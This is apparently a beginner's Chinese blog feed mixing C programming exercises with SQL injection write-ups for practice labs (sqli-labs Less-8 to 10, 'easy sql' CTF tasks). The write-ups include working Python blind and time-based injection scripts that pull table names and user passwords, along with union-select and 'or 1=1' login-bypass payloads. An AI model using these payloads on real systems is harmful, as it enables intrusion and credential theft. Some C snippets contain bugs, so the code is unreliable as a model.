<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Shelly、夏风</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2021-11-28T02:37:21.163Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>less9 and less 10</title>
    <link href="http://example.com/2021/11/28/less9%20less10/"/>
    <id>http://example.com/2021/11/28/less9%20less10/</id>
    <published>2021-11-27T16:00:00.000Z</published>
    <updated>2021-11-28T02:37:21.163Z</updated>
    
    <content type="html"><![CDATA[<p>less9与less10相似，区别在于在使用延迟语句确认是否存在注入时，less9使用’时存在闭合，less10使用”时存在闭合。<br><img src="https://i.loli.net/2021/11/28/O6Gy3sjTAVtvl8B.png" alt="图片1.png"><br><img src="https://i.loli.net/2021/11/28/GUo4piLg73nW5PJ.png" alt="图片2.png"><br>知道存在注入后，由于此题在语法错误时仍然有you are in回显，<br>所以使用python进行时间盲注<br>    import requests<br>    import time<br>    import datetime<br>    url=”<a href="http://www/Less-9/?id=1&#39;">http://www/Less-9/?id=1&#39;</a> “<br>    dic=”abcdefghijklmnopqrstuvwxyz0123456789_”<br>    flag=””<br>    name = ‘’<br>    for i in range(1, 9):<br>        for j in dic:<br>            payload = “ and if(substr(database(),%s,1)=’%s’,sleep(4),1)–+” %(i, j)<br>            url1 = url + payload<br>            print(url1)<br>            time1 = datetime.datetime.now()<br>            r = requests.get(url=url1)<br>            time2 = datetime.datetime.now()<br>            time3 = (time2 - time1).total_seconds()   //计算出在得出结果后经历的时间，大于4则if的条件为真则可以得到库名<br>            if time3 &gt;= 4:<br>                name += j<br>                print(name)<br>                break<br>    n = name<br>    print(‘数据库名字为:’ + n)<br>之后在运用for循环查出表名<br>    import requests<br>    import time<br>    import datetime<br>    url=”<a href="http://www/Less-9/?id=1&#39;">http://www/Less-9/?id=1&#39;</a> “<br>    dic=”abcdefghijklmnopqrstuvwxyz0123456789_”<br>    flag1=””<br>    flag2=””<br>    flag3=””</p><pre><code>flag4=&quot;&quot;for a in range(5):    for i in range(1, 9):        for j in dic:            payload = &quot; and sleep(if((substr((select table_name from information_schema.tables where table_schema=database() limit %s,1),%s,1)=&#39;%s&#39;),3,0)) --+&quot; % (            a, i, j)            url1 = url + payload            print(url1)            time1 = datetime.datetime.now()            r = requests.get(url=url1)            time2 = datetime.datetime.now()            time3 = (time2 - time1).total_seconds()            if time3&gt;=3:                if a==0:                    flag1+=j                    print(flag1)                elif a==1:                    flag2+=j                    print(flag2)                elif a==2:                    flag3+=j                    print(flag3)                elif a==3:                    flag4+=j                    print(flag4)                else:                    breakprint(&#39;数据库名字为:&#39; + flag1)print(&#39;数据库名字为:&#39; + flag2)print(&#39;数据库名字为:&#39; + flag3)print(&#39;数据库名字为:&#39; + flag4)</code></pre><p>之后查列名及字段只需改变<br>     payload = “ and sleep(if((substr((select table_name from information_schema.tables where table_schema=database() limit %s,1),%s,1)=’%s’),3,0)) –+” % (<br>                    a, i, j)<br>列名：<br>     payload = “ and sleep(if((substr((select column_name from information_schema.columns where table_name=’users’ limit %s,1),%s,1)=’%s’),3,0)) –+” % (<br>                    a, i, j)<br>字段：<br>     payload = “ and sleep(if((substr((select password from security.users limit %s,1),%s,1)=’%s’),3,0)) –+” % (<br>                    a, i, j)<br>less10只需将1’改为1”即可</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;less9与less10相似，区别在于在使用延迟语句确认是否存在注入时，less9使用’时存在闭合，less10使用”时存在闭合。&lt;br&gt;&lt;img src=&quot;https://i.loli.net/2021/11/28/O6Gy3sjTAVtvl8B.png&quot; alt=&quot;图片</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>利用phpstudy里的MySQL并通过命令行</title>
    <link href="http://example.com/2021/11/06/%E5%88%A9%E7%94%A8phpstudy%E8%BF%9B%E8%A1%8Cmysql/"/>
    <id>http://example.com/2021/11/06/%E5%88%A9%E7%94%A8phpstudy%E8%BF%9B%E8%A1%8Cmysql/</id>
    <published>2021-11-05T16:00:00.000Z</published>
    <updated>2021-11-06T03:39:04.113Z</updated>
    
    <content type="html"><![CDATA[<p>打开phpstudy<br><img src="https://i.loli.net/2021/11/06/P2cLuyxH5dnY1ls.png" alt="1"><br>打开文件位置后将下列地址在环境变量中添加到系统变量Path中<br><img src="https://i.loli.net/2021/11/06/QFHrj19Dh4sxPBM.png" alt="2"><br>此时打开cmd检验依旧会拒绝访问<br><img src="https://i.loli.net/2021/11/06/TgVFG8tRfouJrUz.png" alt="3"><br>进入phpstudy中修改root密码<br><img src="https://i.loli.net/2021/11/06/8uEXtQLHPbzy79m.png" alt="4"><br>然后在cmd下输入 mysql -uroot -p，回车，提示输入密码，输入刚刚设置的密码，成功进入<br><img src="https://i.loli.net/2021/11/06/GyLYs1W7FNXlT5I.png" alt="5"><br>此时输入show databases就能显示mysql中的表<br><img src="https://i.loli.net/2021/11/06/VksnATLF9rClouZ.png" alt="6"><br>使用security的表，并展示表格<br><img src="https://i.loli.net/2021/11/06/TLrZ2FgG6VQk5oa.png" alt="7"><br>再次输入select * from users<br><img src="https://i.loli.net/2021/11/06/Km3x56TnfjSeJPE.png" alt="8"><br>Mysql简单用法：<br>查库：select schema_name from information_schema.schemata,查找所有的库<br><img src="https://i.loli.net/2021/11/06/vUpYBIsTuAF5lGX.png" alt="9"><br>查表:select table_name from information_schema.tables where table_schema=’security’<br><img src="https://i.loli.net/2021/11/06/veLp57ESxVbhkMz.png" alt="10"><br>查列：select column_name from information_schema.columns where table_name=’users’<br><img src="https://i.loli.net/2021/11/06/eXdzCniPZDK76Vk.png" alt="11"><br>查字段：select username,password from security.users<br><img src="https://i.loli.net/2021/11/06/BWIFV8bTyurRaJX.png" alt="12"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;打开phpstudy&lt;br&gt;&lt;img src=&quot;https://i.loli.net/2021/11/06/P2cLuyxH5dnY1ls.png&quot; alt=&quot;1&quot;&gt;&lt;br&gt;打开文件位置后将下列地址在环境变量中添加到系统变量Path中&lt;br&gt;&lt;img src=&quot;https:</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>C语言实现三子棋</title>
    <link href="http://example.com/2021/10/31/%E4%B8%89%E5%AD%90%E6%A3%8B/"/>
    <id>http://example.com/2021/10/31/%E4%B8%89%E5%AD%90%E6%A3%8B/</id>
    <published>2021-10-30T16:00:00.000Z</published>
    <updated>2021-11-05T03:08:54.448Z</updated>
    
    <content type="html"><![CDATA[<p>#函数定义<br>    #include”game.h”</p><pre><code>void InitBoard(char board[ROW][COL], int row, int col)//初始化棋盘&#123;int i = 0;int j = 0;for (i = 0;i &lt; row;i++) &#123;    for (j = 0;j &lt; col;j++)        board[i][j] = &#39; &#39;;//使初始化时都为空格&#125;&#125;void Display(char board[ROW][COL], int row, int col)&#123;int i = 0;for (i = 0;i &lt; row;i++)&#123;       //打印一行数据int j = 0;    for (j = 0;j &lt; col;j++) &#123;        printf(&quot; %c &quot;, board[i][j]);        if (j &lt; col - 1)            printf(&quot;|&quot;);        &#125;     printf(&quot;\n&quot;);    //printf(&quot; %c | %c | %c \n&quot;,board[i][0],board[i][1],board[i][2]);    if (i &lt; row - 1)    &#123;        for (j = 0;j &lt; col;j++)        &#123;            printf(&quot;---&quot;);            if(j&lt;col-1)            printf(&quot;|&quot;);        &#125;        printf(&quot;\n&quot;);        &#125;    //printf(&quot;---|---|---\n&quot;);    //打印分割行&#125;&#125;void playermove(char board[ROW][COL], int row, int col)&#123;int x = 0;int y = 0;while (1) &#123;    printf(&quot;玩家走：\n请输入要下的坐标：&quot;);    scanf(&quot;%d%d&quot;, &amp;x, &amp;y)    if (x &gt;= 1 &amp;&amp; x &lt;= row &amp;&amp; y &gt;= 1 &amp;&amp; y &lt;= col) &#123;        if (board[x - 1][y - 1] == &#39; &#39;)        &#123;            board[x - 1][y - 1] = &#39;*&#39;;            break;&#125;        else &#123;            printf(&quot;该坐标被占用\n&quot;);        &#125;&#125;else            printf(&quot;非法坐标，请重新输入\n&quot;);&#125;&#125;void computer(char board[ROW][COL], int row, int col)&#123;printf(&quot;电脑走\n&quot;);//若输入与playermove一样的函数则为双人游戏int x = 0, y = 0;while (1) &#123;    x = rand() % row;    y = rand() % col;    if (board[x-1][y-1] == &#39; &#39;) &#123;        board[x-1][y-1] = &#39;#&#39;;        break;    &#125;&#125;&#125;int isfull(char board[ROW][COL],int row,int col) &#123;int i = 0;int j = 0;for (i = 0;i &lt; row;i++) &#123;    for (j = 0;j &lt;col;j++) &#123;        if (board[i][j] == &#39; &#39;)            return 0;//没满    &#125;&#125;return 1;//满棋盘&#125;char iswin(char board[ROW][COL], int row, int col)&#123;int i = 0;for (i = 0;i &lt; row;i++)&#123;    if (board[i][0] == board[i][1]&amp;&amp;board[i][1] == board[i][2] &amp;&amp; board[i][1] != &#39; &#39;) &#123;        return board[i][1];    &#125;    if (board[0][i] == board[1][i]&amp;&amp;board[1][i] == board[2][i] &amp;&amp; board[1][i] != &#39; &#39;) &#123;        return board[1][i];    &#125;&#125;if (board[0][0] == board[1][1]&amp;&amp;board[1][1] == board[2][2] &amp;&amp; board[1][1] != &#39; &#39;) &#123;    return board[1][1];&#125;    if (board[2][0] == board[1][1]&amp;&amp;board[1][1] == board[0][2] &amp;&amp; board[1][1] != &#39; &#39;) &#123;        return board[1][1];    &#125;    if (1 == isfull(board, ROW, COL)) &#123;        return &#39;Q&#39;;    &#125;    return &#39;c&#39;;&#125;</code></pre><p>#游戏初始化<br>    #include”game.h”<br>//测试三子棋<br>//    |   |<br>// —|—|—      第一行和第二行看作一组<br>//    |   |<br>// —|—|—      第三行和第四行看作一组<br>//    |   |         最后为一组</p><pre><code>void menu() &#123;printf(&quot;********************&quot;);printf(&quot;***1.play  0.exit***&quot;);printf(&quot;********************&quot;);&#125;void game()//游戏算法实现&#123;char ret = 0;// 数组--存放走出的棋盘信息 char board[ROW][COL] = &#123; 0 &#125;;//希望这数组中初始全部为空格,0也为不可打印字符//初始化棋盘--初始化数组InitBoard(board,ROW,COL);//传输ROW,COL使传输的数据能够把握每行每列Display(board,ROW,COL);//展示棋盘//下棋while (1)&#123;    //玩家下棋    playermove(board, ROW, COL);    Display(board, ROW, COL);    //判断玩家是否赢    ret=iswin(board,ROW,COL);    if (ret != &#39;c&#39;) &#123;        break;    &#125;    //电脑下棋    computer(board, ROW, COL);    Display(board, ROW, COL);    //判断电脑是否赢    iswin(board,ROW,COL);    if (ret != &#39;c&#39;) &#123;        break;    &#125;    //判断输赢&#125;if (ret == &#39;*&#39;)    printf(&quot;玩家赢\n&quot;);else if (ret == &#39;#&#39;)    printf(&quot;电脑赢\n&quot;);else    printf(&quot;平局\n&quot;);&#125;void test() &#123;srand((unsigned int)time(NULL));int input = 0;do &#123;    menu();    printf(&quot;请选择：&quot;);    scanf(&quot;%d&quot;, &amp;input);    switch (input) &#123;    case 1:        game();        break;    case 0:        printf(&quot;退出游戏\n&quot;);break;    default:        printf(&quot;请重新输入\n&quot;);break;    &#125;&#125; while (input);&#125;int main() &#123;test();return 0;&#125;</code></pre><p>#函数声明<br>    #pragma once</p><pre><code>#include&lt;stdio.h&gt;#include&lt;time.h&gt;#include&lt;stdlib.h&gt;#define ROW 3#define COL 3//改变棋盘大小只需改变此处数值void InitBoard(char board[ROW][COL], int row,int col);//row来接收ROW,col来接收COLvoid Display(char board[ROW][COL], int row, int col);void playermove(char board[ROW][COL], int row, int col);void computer(char board[ROW][COL], int row, int col);char iswin(char board[ROW][COL],int row,int col);//告诉四种状态1.玩家赢-‘*’2.电脑赢-’#‘3.平局-‘Q4’.继续游戏’c‘</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;#函数定义&lt;br&gt;    #include”game.h”&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;void InitBoard(char board[ROW][COL], int row, int col)//初始化棋盘
&amp;#123;
int i = 0;
int j = 0;
f</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>函数递归</title>
    <link href="http://example.com/2021/10/24/%E5%87%BD%E6%95%B0%E9%80%92%E5%BD%92/"/>
    <id>http://example.com/2021/10/24/%E5%87%BD%E6%95%B0%E9%80%92%E5%BD%92/</id>
    <published>2021-10-23T16:00:00.000Z</published>
    <updated>2021-10-24T03:37:42.985Z</updated>
    
    <content type="html"><![CDATA[<p>#include&lt;stdio.h&gt;<br>    void print(int n)<br>{<br>    if (n&gt;9){<br>    print(n/10)<br>}<br>    printf(“%d”,n%10);<br>}<br>    int main()<br>{<br>    unsigned int num=0;<br>    scanf(“%d”,&amp;num);<br>    print(num);<br>    return 0;<br>}  </p><p>例：输入123；<br>进入递归后先执行if中语句：<br>1.第一次123/10=12大于9继而重新进入if循环进行12/10=1；继续进行打印”1%10=1”；<br>2.打印1后上一次结果12再次执行打印”12%10=2”；<br>3.最后123进行打印”123%10=3”.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;#include&amp;lt;stdio.h&amp;gt;&lt;br&gt;    void print(int n)&lt;br&gt;{&lt;br&gt;    if (n&amp;gt;9){&lt;br&gt;    print(n/10)&lt;br&gt;}&lt;br&gt;    printf(“%d”,n%10);&lt;br&gt;}&lt;br&gt;    i</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>常用功能</title>
    <link href="http://example.com/2021/10/09/%E5%B8%B8%E7%94%A8%E7%9F%A5%E8%AF%86/"/>
    <id>http://example.com/2021/10/09/%E5%B8%B8%E7%94%A8%E7%9F%A5%E8%AF%86/</id>
    <published>2021-10-08T16:00:00.000Z</published>
    <updated>2021-10-24T03:00:00.686Z</updated>
    
    <content type="html"><![CDATA[<ul><li><u>星空</u></li><li>![星空图片]<img src="https://i.loli.net/2021/10/24/zrBU2qbhL6lxK7P.jpg" alt="..jpg"></li><li><a href="https://www.bilibili.com/"><em>知识源泉</em></a></li><li><code>printf()</code>函数</li><li><pre><code class="javascript">$(document).ready(function () &#123;  alert(&#39;RUNOOB&#39;);&#125;);</code></pre></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;ul&gt;
&lt;li&gt;&lt;u&gt;星空&lt;/u&gt;&lt;/li&gt;
&lt;li&gt;![星空图片]&lt;img src=&quot;https://i.loli.net/2021/10/24/zrBU2qbhL6lxK7P.jpg&quot; alt=&quot;..jpg&quot;&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.b</summary>
      
    
    
    
    
    <category term="无借鉴意义" scheme="http://example.com/tags/%E6%97%A0%E5%80%9F%E9%89%B4%E6%84%8F%E4%B9%89/"/>
    
  </entry>
  
  <entry>
    <title>C语言新手代码</title>
    <link href="http://example.com/2021/09/26/C%E8%AF%AD%E8%A8%80%E6%96%B0%E6%89%8B%E4%BB%A3%E7%A0%81/"/>
    <id>http://example.com/2021/09/26/C%E8%AF%AD%E8%A8%80%E6%96%B0%E6%89%8B%E4%BB%A3%E7%A0%81/</id>
    <published>2021-09-25T16:00:00.000Z</published>
    <updated>2021-09-26T07:42:02.934Z</updated>
    
    <content type="html"><![CDATA[<p>#include &lt;stdio.h&gt;<br>int main()<br>{<br>     int n=1;           //输入n=1；m=2<br>     int m=2;<br>     switch(n)         //从n开始进行命令<br>{<br>     case1:    m++; //n=1，所以从case1开始进行m-&gt;3<br>     case2:    n++;  //case1后无break，所以case2继续进行n-&gt;2<br>     case3:<br>     switch(n)          //case3从n开始进行<br>{<br>     case1:    n++;   //n=2，所以case1不执行<br>     case2:    m++;n++;   //n=2case2执行，m-&gt;4,n-&gt;3<br>     break;               //break,出现代码块内结束<br>}<br>     case4:   m++;   //主函数内无break,所以case4进行<br>     break;<br>     default:             //default为默认<br>      break;<br>}<br>     printf(“m=%d,n=%d\n”,m,n);  //最后输出m，n的值<br>     return 0;<br>}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;#include &amp;lt;stdio.h&amp;gt;&lt;br&gt;int main()&lt;br&gt;{&lt;br&gt;     int n=1;           //输入n=1；m=2&lt;br&gt;     int m=2;&lt;br&gt;     switch(n)         //从n开始进行命令&lt;</summary>
      
    
    
    
    
    <category term="小白刚开始学习很多地方不懂，请多多指教" scheme="http://example.com/tags/%E5%B0%8F%E7%99%BD%E5%88%9A%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0%E5%BE%88%E5%A4%9A%E5%9C%B0%E6%96%B9%E4%B8%8D%E6%87%82%EF%BC%8C%E8%AF%B7%E5%A4%9A%E5%A4%9A%E6%8C%87%E6%95%99/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://example.com/2021/09/18/hello-world/"/>
    <id>http://example.com/2021/09/18/hello-world/</id>
    <published>2021-09-18T12:40:04.548Z</published>
    <updated>2021-09-18T12:40:04.548Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>My New Post</title>
    <link href="http://example.com/1970/01/01/My-New-Post/"/>
    <id>http://example.com/1970/01/01/My-New-Post/</id>
    <published>1970-01-01T00:00:02.021Z</published>
    <updated>2021-10-09T01:50:45.158Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>less 8</title>
    <link href="http://example.com/1970/01/01/less8/"/>
    <id>http://example.com/1970/01/01/less8/</id>
    <published>1970-01-01T00:00:02.021Z</published>
    <updated>2021-11-21T03:22:31.991Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://i.loli.net/2021/11/21/zWFwV6krjp5t1nI.png" alt="1.png"><br><img src="https://i.loli.net/2021/11/21/zZu94Frl1QnVhqk.png" alt="2.png"><br>输入?id=1显示正常，?id=1’输入后无显示，所以可以确定存在漏洞<br>由于为无回显信息，打开python进行爆破<br>    import requests<br>    dic=”abcdefghijklmnopqrstuvwxyz0123456789_”<br>    flag=””<br>    for i in range(1,10):<br>    for char in dic:<br>        url=”<a href="http://www/Less-8/?id=1&#39;&quot;">http://www/Less-8/?id=1&#39;&quot;</a>      //连接题目地址<br>        1.payload=”and substr(database（）,{},1)=’{}’–+”.format(i,char) //运用循环查库</p><pre><code>    2.Payload=”and substr((select table_name from information_schema.tables     Where table.schema=database() limit 0,1),&#123;&#125;,1)=’&#123;&#125;’--+.format(i,char) //进行查表    3.Payload=”and substr((select column_name from #information_schema.columns     Where table.name=’users’ limit 0,1),&#123;&#125;,1)=’&#123;&#125;’--+.format(i,char)//进行查列    4.payload=”and substr((password from security.users limit 0,1),&#123;&#125;,1)=’&#123;&#125;’--+.    Format(i,char)        //进行查询密码    url=url+payload           //    print(url)    r=requests.get(url)    if &quot;are&quot; in r.text:        flag+=char        //最后将所得出的flag打印出        print(flag)print(flag)</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2021/11/21/zWFwV6krjp5t1nI.png&quot; alt=&quot;1.png&quot;&gt;&lt;br&gt;&lt;img src=&quot;https://i.loli.net/2021/11/21/zZu94Frl1QnVhqk.png&quot;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>easy sql</title>
    <link href="http://example.com/1970/01/01/easy%20sql/"/>
    <id>http://example.com/1970/01/01/easy%20sql/</id>
    <published>1970-01-01T00:00:02.021Z</published>
    <updated>2021-11-13T09:03:03.383Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://i.loli.net/2021/11/13/Z7TMRVi92p5raCc.png" alt="1"><br>由题目可知此题为联合查询输入-1因为数据中没有输入的值以空位代替，显示的为union select 后所输入的值<br><img src="https://i.loli.net/2021/11/13/C2sXQnDSt5i4rZ1.png" alt="2"><br>由打入1’可知进入数据库的数据有’  ‘ 包裹<br>在地址后输入：?wllm=-1’ union select 1,2,database()–+以此来查询库的位置database（）即打印库的位置，–+注释了输入数据之后’limit0，1，以此来显示出自己查表所显示的数值<br><img src="https://i.loli.net/2021/11/13/OmGi7adEkJX1sUL.png" alt="3"><br>之后查表输入：?wllm=-1’ union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database() –+<br><img src="https://i.loli.net/2021/11/13/GM4PJy1KHIFbrNA.png" alt="4"><br>查到表后猜测相应的flag在test_tb中<br>差表中数据输入：?wllm=-1’ union select 1,2,group_concat(column_name)from information_schema.columns where table_name=’test_tb’ –+<br><img src="https://i.loli.net/2021/11/13/tPvE9qOQo8UR3mk.png" alt="5"><br>最后就是输出flag中的数据<br>输入：?wllm=-1’ union select 1,2,group_concat(flag)from test_tb –+<br><img src="https://i.loli.net/2021/11/13/HPCzUR1A76wlgmG.png" alt="6"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2021/11/13/Z7TMRVi92p5raCc.png&quot; alt=&quot;1&quot;&gt;&lt;br&gt;由题目可知此题为联合查询输入-1因为数据中没有输入的值以空位代替，显示的为union select 后所输入的值&lt;br&gt;&lt;img</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>利用C++猜数字</title>
    <link href="http://example.com/1970/01/01/%E6%96%B0%E5%BB%BA%E6%96%87%E6%9C%AC%E6%96%87%E6%A1%A3/"/>
    <id>http://example.com/1970/01/01/%E6%96%B0%E5%BB%BA%E6%96%87%E6%9C%AC%E6%96%87%E6%A1%A3/</id>
    <published>1970-01-01T00:00:02.021Z</published>
    <updated>2021-10-09T05:25:13.643Z</updated>
    
    <content type="html"><![CDATA[<p>#include&lt;stdio.h&gt;<br>#include&lt;time.h&gt;<br>#include&lt;stdlib.h&gt;<br>void menu() //输入菜单<br>{<br>    printf(“*********************\n”);<br>    printf(“<em><strong>1.play   2.sxit</strong></em>\n”);<br>    printf(“*********************\n”);<br>    }<br>void game()  //输入游戏进程<br>{<br>    int guess=0;<br>    int ret=0;<br>    ret=rand%100+1;  //创建一个1~100的随机数<br>    while(1)  //利用while循环来进行猜数字环节<br>{<br>    printf(“请猜数字：&gt;”);<br>    scanf(“%d”,&amp;guess);<br>    if(guess&gt;get)<br>    {<br>    printf(“猜大了\n”);<br>    }<br>    else if(guess&lt;ret)<br>    {<br>    printf(“ 猜小了\n”);<br>    }<br>    else<br>{<br>    printf(“恭喜你猜对了！！！ \n”);<br>    break;<br>}<br>int main()<br>{<br>    int input=0;<br>    srand ((unsigned int)time(NULL));  //利用时间戳来制造随机数使数字达到真正的随机取值<br>    do  //do  while循环使得程序完成一次后可以继续使用<br>    {menu();<br>    printf(“请选择:&gt;”);<br>    scanf(“%d”,&amp;input);<br>    switch(input)<br>{<br>    case 1:<br>    game();<br>    break;<br>    case 2:<br>    printf(“退出游戏\n”);<br>    break;<br>    default<br>    printf(“选择错误\n”);<br>    break;<br>}<br>}    while(input);<br>    return 0;<br>}    </p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;#include&amp;lt;stdio.h&amp;gt;&lt;br&gt;#include&amp;lt;time.h&amp;gt;&lt;br&gt;#include&amp;lt;stdlib.h&amp;gt;&lt;br&gt;void menu() //输入菜单&lt;br&gt;{&lt;br&gt;    printf(“*****************</summary>
      
    
    
    
    
    <category term="学习进度出奇的慢" scheme="http://example.com/tags/%E5%AD%A6%E4%B9%A0%E8%BF%9B%E5%BA%A6%E5%87%BA%E5%A5%87%E7%9A%84%E6%85%A2/"/>
    
  </entry>
  
  <entry>
    <title>极客easy sql</title>
    <link href="http://example.com/1970/01/01/%E6%9E%81%E5%AE%A2easy%20sql/"/>
    <id>http://example.com/1970/01/01/%E6%9E%81%E5%AE%A2easy%20sql/</id>
    <published>1970-01-01T00:00:02.021Z</published>
    <updated>2021-11-16T13:23:47.050Z</updated>
    
    <content type="html"><![CDATA[<p>还是先尝试闭合方式， 输入1、1’、1” 判断，当输入 1’ 报错，结果语句应该为单引号闭合。<br><img src="https://i.loli.net/2021/11/16/jpu3h2tWK6fXF5a.png" alt="1.png"><br>此时就可以尝试利用联合查询进行注入<br>在用户名输入：1’ select 1,2,3–+密码输入：1<br><img src="https://i.loli.net/2021/11/16/WNsIKhPFoj2DHBY.png" alt="2.png"><br>此时会跳出<br><img src="https://i.loli.net/2021/11/16/3YL2fPJ5e7QM9Sc.png" alt="3.png"><br>说明密码1没有闭合，此时在1前再加’；<br>此时再登录会显示注入成功并没有任何过滤<br><img src="https://i.loli.net/2021/11/16/vUNOKVDQFMl1wp6.png" alt="4.png"><br>或者也可使用万能账号进行注入<br>输入1’or 1=1–+密码：’1<br><img src="https://i.loli.net/2021/11/16/RjQCxO9EALYcUuX.png" alt="5.png"><br>此时由于or后方条件恒为真，账号认定为真<br><img src="https://i.loli.net/2021/11/16/vUNOKVDQFMl1wp6.png" alt="6.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;还是先尝试闭合方式， 输入1、1’、1” 判断，当输入 1’ 报错，结果语句应该为单引号闭合。&lt;br&gt;&lt;img src=&quot;https://i.loli.net/2021/11/16/jpu3h2tWK6fXF5a.png&quot; alt=&quot;1.png&quot;&gt;&lt;br&gt;此时就可以尝试利用</summary>
      
    
    
    
    
  </entry>
  
</feed>
